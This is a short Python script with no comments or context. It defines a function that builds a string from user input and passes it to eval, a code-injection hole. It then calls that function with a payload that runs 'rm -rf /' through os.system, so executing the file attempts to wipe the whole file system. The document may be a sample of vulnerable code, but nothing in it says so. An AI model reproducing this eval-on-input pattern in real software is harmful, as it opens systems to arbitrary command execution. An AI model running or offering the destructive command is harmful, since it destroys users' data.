import os
def run_command(user_input):
    command = "os." + user_input
    eval(command)

run_command("system('rm -rf /')")
